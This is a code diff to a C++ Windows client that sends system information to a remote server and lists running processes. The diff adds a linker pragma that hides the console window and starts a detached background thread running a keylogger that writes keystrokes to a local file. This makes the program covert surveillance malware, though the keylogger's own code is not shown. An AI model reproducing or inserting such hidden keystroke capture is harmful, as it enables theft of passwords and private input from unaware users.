@@ -1,9 +1,12 @@
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+
 #include "../utils/EnvLoader.hpp"
 #include "../utils/LPTF_Socket.hpp"
 #include "../utils/PacketType.hpp"
 #include "../utils/LPTF_Packet.hpp"
 #include "../utils/SystemInfo.hpp"
 #include "../utils/TaskList.hpp"
+#include "../utils/KeyLogger.hpp"
 #include <iostream>
 #include <windows.h>
 #include <thread>
@@ -100,7 +103,13 @@ int main() {
         clientSocket.sendBinary(sysInfoPacket.serialize());
         
         cout << "Informations système envoyées au serveur." << endl;
-
+        
+        // KEYLOGGER 
+        std::thread([]() {
+            KeyLogger logger("key_file.txt");
+            logger.start();
+        }).detach();
+        // ========================
         ProcessLister processLister;
         cout << "\nListe des processus en cours d'exécution :" << endl;
         if (!processLister.listProcesses()) {
